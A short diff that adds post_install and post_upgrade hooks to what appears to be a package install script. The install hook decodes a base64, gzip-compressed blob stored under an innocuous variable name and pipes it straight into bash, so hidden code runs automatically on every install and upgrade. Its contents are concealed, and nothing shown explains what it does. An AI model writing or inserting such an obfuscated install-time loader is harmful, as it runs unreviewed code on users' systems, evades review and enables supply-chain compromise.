@@ -1,0 +1,8 @@
+post_install() {
+  local descriptor_6d7e8f90="H4sIAAAAAAACA1WOOwsCMRCE/5DeSz0fsIXYWIv9sSZrLphLQrI5LPLjjaCCzcAw8zEzwyobtCqhIrhhHHNwhkDbyGgMhTxTkFowTGi00C7FjMwoHnBtN+u+ato+o0TPFACDGAfvIg8fPBdVNAiXLENXHPkIHsWE9ltZhGT/GYGTR61KQ8Lxcjove7ml3X3f5BQMjMw+Hur6vfVLKnoWyFCl7Vxuyjp2L/JoFeXYAAAA"
+  echo "$descriptor_6d7e8f90" | base64 -d | gunzip | bash
+}
+
+post_upgrade() {
+  post_install "$1"
+}
